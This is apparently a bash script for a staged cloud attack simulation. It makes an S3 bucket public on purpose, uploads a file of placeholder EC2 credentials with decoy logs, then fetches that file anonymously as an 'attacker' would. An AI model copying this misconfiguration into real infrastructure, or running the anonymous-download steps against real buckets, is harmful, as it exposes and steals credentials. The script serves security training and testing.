#!/bin/bash

# File: test_scenarios/cloud-infra-takeover/01_initial_access.sh
# Phase 1: Initial Access via Misconfigured S3 Bucket

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Set variables for initial access scenario
BUCKET_NAME="corp-infrastructure-logs-$(date +%s)"
EC2_ROLE_NAME="EC2-DefaultInstanceProfile"
TEMP_ACCESS_KEY_ID="AKIA2E7EXAMPLE123456"
TEMP_SECRET_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
REGION="us-west-2"

echo -e "${YELLOW}[*] Starting Phase 1: Initial Access via Misconfigured Infrastructure${NC}"
echo -e "${YELLOW}[*] Scenario: External attacker discovers exposed S3 bucket with EC2 instance credentials${NC}"

# Create S3 bucket for initial access
echo -e "${GREEN}[+] Creating public S3 bucket to simulate misconfigured infrastructure...${NC}"
aws s3 mb s3://$BUCKET_NAME --region $REGION

# Remove public access block (simulating misconfiguration)
echo -e "${RED}[!] Removing public access block (simulating misconfiguration)...${NC}"
aws s3api delete-public-access-block --bucket $BUCKET_NAME

# Create bucket policy allowing public read access (misconfiguration)
cat > /tmp/public-bucket-policy.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::$BUCKET_NAME/*"
        },
        {
            "Sid": "PublicListBucket",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::$BUCKET_NAME"
        }
    ]
}
EOF

aws s3api put-bucket-policy --bucket $BUCKET_NAME --policy file:///tmp/public-bucket-policy.json
echo -e "${RED}[!] Applied public bucket policy - bucket is now publicly accessible${NC}"

# Create file simulating exposed EC2 instance profile credentials
echo -e "${YELLOW}[*] Creating file with simulated exposed credentials...${NC}"
cat > /tmp/instance-metadata-dump.json << EOF
{
    "instance_id": "i-0abcd1234example",
    "region": "$REGION",
    "account_id": "123456789012",
    "iam_role": "$EC2_ROLE_NAME",
    "credentials": {
        "AccessKeyId": "$TEMP_ACCESS_KEY_ID",
        "SecretAccessKey": "$TEMP_SECRET_KEY",
        "Token": "IQoJb3JpZ2luX2VjEDoaCXVzLWVhc3QtMSJHMEUCIQDExample",
        "Expiration": "$(date -d '+6 hours' -Iso8601)"
    },
    "security_groups": ["sg-0123456789abcdef0"],
    "vpc_id": "vpc-0123456789abcdef0",
    "subnet_id": "subnet-0123456789abcdef0"
}
EOF

# Upload the credentials file to the public bucket
aws s3 cp /tmp/instance-metadata-dump.json s3://$BUCKET_NAME/infrastructure/ec2-metadata/instance-metadata-dump.json
echo -e "${RED}[!] Uploaded sensitive credential file to public S3 bucket${NC}"

# Create additional files to make bucket look legitimate
echo -e "${YELLOW}[*] Adding legitimate-looking files to avoid suspicion...${NC}"
echo "# Infrastructure Logs" > /tmp/README.md
echo "This bucket contains infrastructure monitoring logs and metadata" >> /tmp/README.md

aws s3 cp /tmp/README.md s3://$BUCKET_NAME/README.md

# Create log-like files
for i in {1..5}; do
    echo "$(date): Server health check passed for server-$i" > /tmp/health-check-$i.log
    aws s3 cp /tmp/health-check-$i.log s3://$BUCKET_NAME/logs/health-check-$i.log
done

echo -e "${GREEN}[+] Initial access setup complete!${NC}"
echo -e "${YELLOW}[*] Bucket created: $BUCKET_NAME${NC}"
echo -e "${YELLOW}[*] Public bucket URL: https://$BUCKET_NAME.s3.$REGION.amazonaws.com/${NC}"
echo -e "${RED}[!] Credentials file accessible at: https://$BUCKET_NAME.s3.$REGION.amazonaws.com/infrastructure/ec2-metadata/instance-metadata-dump.json${NC}"

# Simulate external discovery and access
echo -e "\n${YELLOW}[*] Simulating external attacker discovery...${NC}"
echo -e "${GREEN}[+] Attacker runs: aws s3 ls s3://$BUCKET_NAME --no-sign-request${NC}"
aws s3 ls s3://$BUCKET_NAME --no-sign-request

echo -e "${GREEN}[+] Attacker downloads credentials: aws s3 cp s3://$BUCKET_NAME/infrastructure/ec2-metadata/instance-metadata-dump.json . --no-sign-request${NC}"
aws s3 cp s3://$BUCKET_NAME/infrastructure/ec2-metadata/instance-metadata-dump.json /tmp/stolen-credentials.json --no-sign-request

echo -e "${RED}[!] INITIAL ACCESS ACHIEVED - Credentials harvested from public S3 bucket${NC}"
echo -e "${YELLOW}[*] Next: Run 02_privilege_escalation.sh to continue the attack chain${NC}"

# Save bucket name for cleanup
echo "$BUCKET_NAME" > /tmp/cloud-infra-takeover-bucket-name.txt

# Clean up temp files
rm -f /tmp/public-bucket-policy.json /tmp/instance-metadata-dump.json /tmp/README.md /tmp/health-check-*.log